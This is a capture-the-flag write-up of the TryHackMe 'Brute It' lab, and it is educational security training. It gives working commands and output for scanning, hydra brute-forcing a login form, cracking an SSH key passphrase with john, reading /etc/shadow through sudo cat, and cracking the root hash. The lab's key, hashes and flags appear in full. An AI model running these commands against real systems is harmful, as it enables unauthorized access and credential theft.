# <div align="center">[Brute It](https://tryhackme.com/room/bruteit)</div>
<div align="center">Brute Force+Privilege Escalastion</div>
<br>
<div align="center">
  <img height="200" alt="image" src="https://github.com/user-attachments/assets/9ec84e94-f8e0-4940-8a04-6f3c2bafcd25" />
</div>

# Task 1. About this box
In this box you will learn about:

- Brute-force

- Hash cracking

- Privilege escalation

Connect to the TryHackMe network, and deploy the machine.

> Deploy the machine

```
No answer needed
```

# Task 2. Reconnaissance
Before attacking, let's get information about the target

> Q1. Search for open ports using nmap. <br>
How many ports are open?

I used the command: `nmap -sS -sC -sV -p- 10.48.159.66`
Output:
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-08 10:25 +0530
Nmap scan report for 10.48.159.66
Host is up (0.0093s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.18 seconds
```

Answer:

```
2
```

<br>


> Q2. What version of SSH is running?

Checking the output from Q1, gives the answer.

Answer:
```
OpenSSH 7.6p1
```

<br> 


> Q3. What version of Apache is running?

The output from Q1 holds the answer.

Answer:
```
2.4.29
```

<br> 

> Q4. Which Linux distribution is running?

The nmap result in Q1 clearly states the linux distribution.

Answer:
```
Ubuntu
```

<br> 

> Q5. Search for hidden directories on web server.
What is the hidden directory?

I used the command: `gobuster dir -u http://10.48.159.66 -w /usr/share/wordlists/dirb/common.txt` which gave the hidden directory.

Answer:
```
/admin
```

# Task 3. Getting A Shell

Find a form to get a shell on SSH.

> Q1.What is the user:password of the admin panel?

I went to the webpage: `http://10.48.159.66/admin/` which revealed a login form. The source code of the page gave the following information:
`<!-- Hey john, if you do not remember, the username is admin -->`
I tried a few common passwords but they dint work so i used the tool hydra and ran the following command:
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.48.159.66 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid" -V
```
Result:
```
[80][http-post-form] host: 10.48.159.66   login: admin   password: xavier
1 of 1 target successfully completed, 1 valid password found
```

I tried the above credentials resulting in a successful login.

Answer:
```
admin:xavier
```

<br> 


> Q2. Crack the RSA key you found.
What is John's RSA Private Key passphrase?

The login page held a link to the encrypted RSA key:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,E32C44CDC29375458A02E94F94B280EA

JCPsentybdCSx8QMOcWKnIAsnIRETjZjz6ALJkX3nKSI4t40y8WfWfkBiDqvxLIm
UrFu3+/UCmXwceW6uJ7Z5CpqMFpUQN8oGUxcmOdPA88bpEBmUH/vD2K/Z+Kg0vY0
BvbTz3VEcpXJygto9WRg3M9XSVsmsxpaAEl4XBN8EmlKAkR+FLj21qbzPzN8Y7bK
HYQ0L43jIulNKOEq9jbI8O1c5YUwowtVlPBNSlzRMuEhceJ1bYDWyUQk3zpVLaXy
+Z3mZtMq5NkAjidlol1ZtwMxvwDy478DjxNQZ7eR/coQmq2jj3tBeKH9AXOZlDQw
UHfmEmBwXHNK82Tp/2eW/Sk8psLngEsvAVPLexeS5QArs+wGPZp1cpV1iSc3AnVB
VOxaB4uzzTXUjP2H8Z68a34B8tMdej0MLHC1KUcWqgyi/Mdq6l8HeolBMUbcFzqA
vbVm8+6DhZPvc4F00bzlDvW23b2pI4RraI8fnEXHty6rfkJuHNVR+N8ZdaYZBODd
/n0a0fTQ1N361KFGr5EF7LX4qKJz2cP2m7qxSPmtZAgzGavUR1JDvCXzyjbPecWR
y0cuCmp8BC+Pd4s3y3b6tqNuharJfZSZ6B0eN99926J5ne7G1BmyPvPj7wb5KuW1
yKGn32DL/Bn+a4oReWngHMLDo/4xmxeJrpmtovwmJOXo5o+UeEU3ywr+sUBJc3W8
oUOXNfQwjdNXMkgVspf8w7bGecucFdmI0sDiYGNk5uvmwUjukfVLT9JPMN8hOns7
onw+9H+FYFUbEeWOu7QpqGRTZYoKJrXSrzII3YFmxE9u3UHLOqqDUIsHjHccmnqx
zRDSfkBkA6ItIqx55+cE0f0sdofXtvzvCRWBa5GFaBtNJhF940Lx9xfbdwOEZzBD
wYZvFv3c1VePTT0wvWybvo0qJTfauB1yRGM1l7ocB2wiHgZBTxPVDjb4qfVT8FNP
f17Dz/BjRDUIKoMu7gTifpnB+iw449cW2y538U+OmOqJE5myq+U0IkY9yydgDB6u
uGrfkAYp6NDvPF71PgiAhcrzggGuDq2jizoeH1Oq9yvt4pn3Q8d8EvuCs32464l5
O+2w+T2AeiPl74+xzkhGa1EcPJavpjogio0E5VAEavh6Yea/riHOHeMiQdQlM+tN
C6YOrVDEUicDGZGVoRROZ2gDbjh6xEZexqKc9Dmt9JbJfYobBG702VC7EpxiHGeJ
mJZ/cDXFDhJ1lBnkF8qhmTQtziEoEyB3D8yiUvW8xRaZGlOQnZWikyKGtJRIrGZv
OcD6BKQSzYoo36vNPK4U7QAVLRyNDHyeYTo8LzNsx0aDbu1rUC+83DyJwUIxOCmd
6WPCj80p/mnnjcF42wwgOVtXduekQBXZ5KpwvmXjb+yoyPCgJbiVwwUtmgZcUN8B
zQ8oFwPXTszUYgNjg5RFgj/MBYTraL6VYDAepn4YowdaAlv3M8ICRKQ3GbQEV6ZC
miDKAMx3K3VJpsY4aV52au5x43do6e3xyTSR7E2bfsUblzj2b+mZXrmxst+XDU6u
x1a9TrlunTcJJZJWKrMTEL4LRWPwR0tsb25tOuUr6DP/Hr52MLaLg1yIGR81cR+W
-----END RSA PRIVATE KEY-----
```

I saved it to my machine with the command: `wget http://10.48.159.66/admin/panel/id_rsa`
Output:
```
--2026-04-08 10:51:49--  http://10.48.159.66/admin/panel/id_rsa
Connecting to 10.48.159.66:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1766 (1.7K)
Saving to: ‘id_rsa.1’

id_rsa.1                                100%[============================================================================>]   1.72K  --.-KB/s    in 0s      

2026-04-08 10:51:49 (168 MB/s) - ‘id_rsa.1’ saved [1766/1766]
```
I used the command `/usr/share/john/ssh2john.py id_rsa.1> idrsa.txt` to convert the RSA key into text format. 

Using `john the ripper` we can perform brute force to crack the RSA key using the wordlist rockyou.txt.
Command: `john idrsa.txt --wordlist=/usr/share/wordlists/rockyou.txt`
Output:
```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (id_rsa.1)     
1g 0:00:00:00 DONE (2026-04-08 10:54) 9.090g/s 660072p/s 660072c/s 660072C/s rubicon..rock14
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Answer:
```
rockinroll
```

<br> 

> Q3. user.txt

Using the RSA key I tried for ssh login.
But first I gave the required permissions to the file which held the original encrypted rsa key:
`chmod 600 id_rsa.1 ` 
Then I tried ssh login with the following command: `ssh john@10.48.159.66 -i id_rsa.1`
The paraphrase for the key is: rockinroll from Q2.
Output:
```
ssh john@10.48.159.66 -i id_rsa.1 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa.1': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Apr  8 05:30:49 UTC 2026

  System load:  0.08               Processes:           108
  Usage of /:   25.7% of 19.56GB   Users logged in:     0
  Memory usage: 43%                IP address for ens5: 10.48.159.66
  Swap usage:   0%


63 packages can be updated.
0 updates are security updates.


Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~$ ls
user.txt
john@bruteit:~$ cat user.txt
THM{a_password_is_not_a_barrier}
```

Answer:
```
THM{a_password_is_not_a_barrier}
```

<br> 

> Q4. Web flag

This flag can be found at the webpage: `http://10.48.159.66/admin/` after successful login.

Answer: 
```
THM{brut3_f0rce_is_e4sy}
```

<br> 


# Task 4. Privilege escalation 

Now, we need to escalate our privileges.

> Q1. Find a form to escalate your privileges. <br> 
What is the root's password?

Checking the user-john's privileges with: `sudo -l` gave the following output:
```
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

I checked on gtfobins if we can exploit `/bin/cat`, since we can run it as sudo without password.
GTFOBins provided the specific commands need to exploit `/bin/cat`: `sudo /bin/cat /etc/shadow`
This gave me contents of the file containing all the users and passwords:
```
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
sshd:*:18489:0:99999:7:::
john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::
```

Storing the above in a file named `hashes` and using the tool `john the ripper` along with the wordlist `rockyou.txt` to crack the hashes, using the command:
`john hashes --wordlist=/usr/share/wordlists/rockyou.txt`

Output:
```
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (root)     
1g 0:00:00:28 0.06% (ETA: 23:21:44) 0.03506g/s 381.4p/s 767.4c/s 767.4C/s fermin..saavedra
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

Answer:
```
football
```

<br>

> Q2. root.txt

Using the command `su root` to change the user to root with the password: `football` successful escalated the user from john to root.
Output:
```
john@bruteit:~$ su root
Password: 
root@bruteit:/home/john# ls
user.txt
root@bruteit:/home/john# cd /root
root@bruteit:~# ls
root.txt
root@bruteit:~# cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```
Answer:
```
THM{pr1v1l3g3_3sc4l4t10n}
```

<br>

## 🧠 Summary

 - Performed reconnaissance using nmap to identify services
 - Discovered hidden directory using gobuster
 - Gained admin access via brute-force using hydra
 - Cracked RSA key passphrase using john
 - Accessed system via SSH as user john
 - Exploited sudo misconfiguration to read /etc/shadow
 - Cracked root password and escalated privileges
 - Successfully obtained both user and root flags

<br>
